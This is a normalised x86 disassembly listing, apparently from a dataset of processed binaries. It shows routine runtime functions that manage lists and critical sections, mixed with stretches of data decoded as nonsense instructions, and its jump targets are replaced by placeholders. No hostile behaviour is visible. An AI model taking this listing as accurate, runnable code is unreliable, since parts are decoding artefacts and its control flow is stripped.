add [ eax ] al
lodsb [ esi ]
jno r-xdata
rcl [ edx + esi * 2 ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 ] dl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
in al dx
jae r-xdata
dec [ ebx - 0x3f7c3340 ]
fsubr st1
add bh bh
mov eax [ eax ]
jmp [ eax + 0x28 ]
aam 0x8b
inc esp
and al 0x4
outsb
outsb
je r-xdata
adc al dh
inc ecx
add [ eax ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x4c004171 ] bh
add [ eax ] al
add [ eax + 0x70 ] bl
inc ecx
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al bl
out dx eax
inc ecx
add [ eax + 0x100041f0 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x72 ] dh
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edi ] al
inc ebp
push esp
push 0x64616572
push 0x4172
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp r-xdata
popad
insd
nop
jb r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
add al 0xd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
add [ edi ] cl
cmovns eax [ ebp + 0x73 ]
imul esp [ edi + 0x6e ] 0x6f4e7265
je r-xdata
pop ebp
retn 0x4
inc esp
and al 0x4
aam 0xe9
pop ebx
scasd [ edi ]
add [ eax ] al
int3
jns r-xdata
mov edi 0x830000af
inc esp
and al 0x4
fmul [ ebx - 0x74fbdbbc ]
rcr al 0xe9
mov esp 0x616c4307
jae r-xdata
adc [ eax ] eax
add [ edi ] eax
call 0xffffffffe3e82c1d
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
sub_417644
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4062cc
pop edi
pop esi
pop ebx
retn
sub_41766c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4062b0
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_417694
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4062ec
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4176f0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ edi + 0x41 ] dh
add [ eax + eax ] dl
add [ eax ] al
mov al 0x10
inc eax
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add ah dh
js r-xdata
pop esp
xor eax 0x35600040
add [ ecx ] cl
push esp
push edx
inc edi
jb r-xdata
nop
jne r-xdata
mov [ esp + 0x4 ] edx
mov [ esp ] eax
jne r-xdata
in al dx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
jae r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
add al 0x89
add al 0x24
mov eax eax
nop
ja r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_4177a8
mov esi eax
jmp r-xdata
mov ah 0x32
inc eax
add al dl
xor al [ eax ]
hlt
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
inc eax
add [ esp + edi * 2 ] bl
inc ecx
add [ edx ] cl
push esp
push edx
inc edi
jb r-xdata
shl [ edx ] 0x1
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x24004177 ] dl
add [ eax ] al
add [ eax + 0x4c004010 ] dh
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4177a8
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_418cf8
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403530
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403530
test al al
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403530
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4177a8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_418cf8
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403530
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403530
test al al
je r-xdata
sub_417808
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_4177a8
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4177a8
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403530
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_417878
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4032ec
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_418b9c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4178f4
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
mov eax [ esi + 0x4 ]
call sub_40331c
mov eax [ esi + 0x8 ]
call sub_40331c
mov eax [ esi + 0xc ]
call sub_40331c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_417934
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_418cf8
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_403280
test al al
jne r-xdata
sub_417994
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_418cf8
mov edx eax
mov eax ebp
call sub_403530
test al al
jne r-xdata
sub_4179d8
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_417a73
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_40326c
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40437c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_417934
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_418b9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417a7a
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be84
call sub_403ad0
sub_417a98
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_405470
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_417ab8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_418cf8
mov edx edi
call sub_417a98
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_418cf8
mov edx edi
call sub_417a98
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_418be8
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_417a98
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_418be8
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_417b5c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_418cf8
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_417994
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_417ba8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032ec
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_417878
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418b9c
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_417c1c
push ebx
push esi
push edi
push ebp
call sub_4036d0
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
mov eax [ esi + 0x4 ]
mov edx edi
call sub_418cf8
call sub_40331c
inc edi
dec ebp
jne r-xdata
sub_417c78
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_418cf8
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_417808
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_417cbc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_417934
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_418cf8
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_417d00
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_417d83
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_40326c
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417d8a
lea eax [ ebp - 0x10c ]
call sub_404118
retn
sub_417d90
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_417c78
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_41779c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_417d00
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_418cf8
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418cf8
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403530
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_417c78
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418be8
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_418b9c
sub_417e7c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418cf8
mov edx ebp
call sub_417a80
test al al
jne r-xdata
sub_417ec0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_417878
mov edx eax
mov eax [ edi + 0x4 ]
call sub_418b9c
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418cf8
mov eax [ eax + 0xc ]
mov edx ebp
call sub_418d54
test eax eax
jge r-xdata
sub_417f1c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418cf8
mov esi eax
mov edx ebp
mov eax esi
call sub_417ab8
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_40331c
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418be8
sub_417f6c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4032ec
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_417e58
xor eax eax
push ebp
push sub_41806b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403668
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418072
mov eax [ rw-data ]
call sub_417f10
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418b9c
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_418cf8
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_417994
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418b9c
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_418cf8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_418072
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_418098
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4180c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_417e58
xor edx edx
push ebp
push sub_41813f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_417f10
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403b7c
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418cf8
mov edx [ ebp - 0x4 ]
call sub_417934
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41815c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4181bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4181c3
lea eax [ ebp - 0xc ]
call sub_404118
retn
sub_4181c8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417e58
xor eax eax
push ebp
push sub_41820e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_417cbc
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418215
mov eax [ rw-data ]
call sub_417f10
retn
sub_41821c
push ebx
push esi
mov esi eax
mov eax esi
call sub_4181c8
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_41815c
sub_41823c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417e58
xor eax eax
push ebp
push sub_4182a1
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_417e7c
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_417e64
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4182a8
mov eax [ rw-data ]
call sub_417f10
retn
mov eax ebx
call sub_4032a8
mov ebx eax
sub_4182ac
push ebp
mov ebp esp
push ebx
push esi
mov ecx edx
test ecx ecx
js r-xdata
mov eax esp
mov esi edx
test esi esi
jl r-xdata
mov ebx [ eax + ecx * 4 ]
dec ecx
push ebx
jns r-xdata
mov esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
inc esi
mov ebx eax
mov eax [ ebx ]
call sub_41823c
add ebx 0x4
dec esi
jne r-xdata
sub_4182e0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417e58
xor eax eax
push ebp
push sub_418322
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_417f1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418329
mov eax [ rw-data ]
call sub_417f10
retn
sub_41832c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417e58
xor eax eax
push ebp
push sub_41836e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_417ec0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418375
mov eax [ rw-data ]
call sub_417f10
retn
sub_418378
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_417e58
xor eax eax
push ebp
push sub_4183bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_417d90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4183c6
mov eax [ rw-data ]
call sub_417f10
retn
sub_4183cc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417e58
xor eax eax
push ebp
push sub_41841a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_417b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418421
mov eax [ rw-data ]
call sub_417f10
retn
sub_418480
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403668
pop ebp
retn 0x8
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4184b8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_418480
mov edx eax
mov eax [ rw-data ]
call sub_419034
pop edi
pop esi
pop ebx
retn
sub_4184e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_4190bc
mov esi eax
xor edx edx
push ebp
push sub_41854e
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_419120
retn
mov edx ebx
mov eax esi
call sub_418cf8
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0xc ]
